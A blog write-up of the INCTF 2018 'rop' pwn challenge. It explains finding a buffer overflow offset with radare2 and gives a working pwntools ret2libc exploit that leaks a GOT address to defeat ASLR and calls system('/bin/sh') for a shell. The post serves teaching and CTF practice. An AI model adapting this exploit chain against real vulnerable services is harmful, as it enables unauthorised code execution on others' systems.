---
layout: post
title: INCTF Qualifiers rop 400
updated: 2018-12-10 21:00
image: inctf_rop_400.png
tags: [ctf, binary exploit, tech]
---

## INCTF Qualifiers - rop [400 pts]

Hey, guy's recently I took part in the qualifiers for INCTF 2018. Here's my shot at a writeup for the rop challenge which was a pwn challenge for 400 points. The challenge is a good one especially for a person who is new to binary exploitation.

### A case of ROP

From the name of the challenge it's kinda obvious that it has something to do with return oriented programming. We are presented with two files, one the binary itself and the other libc. We can confirm that this is indeed a rop challenge by running checksec on the binary we got.

{% highlight shell %}
$ checksec rop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
{% endhighlight %}

As NX is enabled we cannot place shellcode to execute on the stack. Instead we can use the stack to point to so called rop gadgets in order to achieve what we want. These gadgets are known as rop gadgets. You can learn more about rop [here](https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf) and [here](https://www.rapid7.com/resources/rop-exploit-explained/).

### The strat

What my plan was or is, was to use ROP and call system with /bin/sh. This should be simple enough if we know 3 things, the offset of the saved instruction pointer, the address of system, the address of the /bin/sh. What we're basically doing is faking a function call, with the parameters and all.

Getting the offset of the saved instruction pointer is rather easy. I did this locally using ragg2 and r2.

{% highlight shell %}
$ ragg2 -P 129 -r > pattern.txt
{% endhighlight %}

Now let's create an r2 profile file, nothing fancy.

{% highlight shell %}
#!/usr/bin/rarun2
stdin=./pattern.txt
{% endhighlight %}

Let's run this and find the offset...

{% highlight shell %}
$ r2 -r profile.rr2 -d rop
Process with PID 2820 started...
= attach 2820 2820
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[0x7f91a360f210]> dc
Welcome fellow hackers
Can you rop your way to shell ?

child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
[0x00401201]> pxw 4 @ rsp
0x7ffcb656a488  0x4a414149                                   IAAJ
[0x00401201]> wopO 0x4a414149
24
[0x00401201]
{% endhighlight %}

So we got the offset. Now moving on to the next part.

## ASLR? What ASLR?

So it looks like the server hosting our binary has ASLR enabled, what this means is that libc is actually loaded at different addresses every run. So how do we counter this? Simple, we just need to leak a GOT address. Once we get the GOT address we can make use of that to recalculate our offset of our functions so that it's correct. But won't the program exit? It will, but we can prevent this by recalling the main function. Then we can easily supply our payload.

Using simple disassembly by r2 we can see that we have a puts function. Perfect we can make use of that to leak the address of the GOT. Once we get the leak, we can subtract our assumed aka default address with the leaked address. This is the amount of change in the address which we need to account for and recalculate our payload addresses with. This task seemingly daunting is highly simplified with pwn tools.

## The attack.

First we generate an exploit temaplate using pwn tools...

{% highlight shell %}
$ pwn template rop --host=13.233.178.121 --port=1337 > exploit.py
{% endhighlight %}

Then we add our exploit inbetween the start and interactive function calls.

{% highlight python %}
...truncated...
libc = ELF('./libc.so.6')

r = ROP(exe)
r.call(exe.sym.puts, [exe.got.puts])
r.call(exe.sym.main)

io.recvuntil('?')
io.recvline()

payload_stage1 = fit({
    24: r.chain()
})

io.sendline(payload_stage1)
io.recvline()
putsstr = io.recvline(False)
io.recvline()

puts = u64(putsstr.ljust(8, "\x00"))
log.info("Putstr addr: %#x", puts)

libcbase = puts - libc.sym.puts
libc.address = libcbase

r = ROP(exe)

system = libc.sym.system
binsh = next(libc.search('/bin/sh'))
r.call(system, [binsh])

payload_stage2 = fit({
    24: r.chain()
})

io.recvuntil('?')
io.recvline()
io.sendline(payload_stage2)
io.recvline()

io.interactive()
{% endhighlight %}

Run it...

{% highlight shell %}
$ ./exploit.py
...
$ cat /home/rop/flag.txt
inctf{r0p_r0p_4ll_th3_way_t0_sh311}
{% endhighlight %}

PWNED!!.
